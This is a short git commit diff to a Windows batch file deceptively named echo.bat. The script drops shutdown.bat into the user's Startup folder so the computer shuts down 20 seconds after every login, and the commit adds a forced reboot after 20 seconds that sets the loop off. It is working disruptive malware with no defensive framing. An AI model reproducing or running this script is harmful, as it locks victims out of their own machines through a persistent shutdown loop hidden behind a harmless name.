29896d0e489ba50f3318957df97cb8c3274b16ad
dionaka <158718748+dionaka@users.noreply.github.com>
2024-10-21 23:10:53 +0800

    更新 echo.bat

--- echo.bat
+++ echo.bat
@@ -1,6 +1,5 @@
 @echo off  
+shutdown -r -t 20
 set "startupPath=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"  
 cd /d "%startupPath%"  
 echo shutdown -s -t 20 > shutdown.bat
-
-shutdown -r -t 0
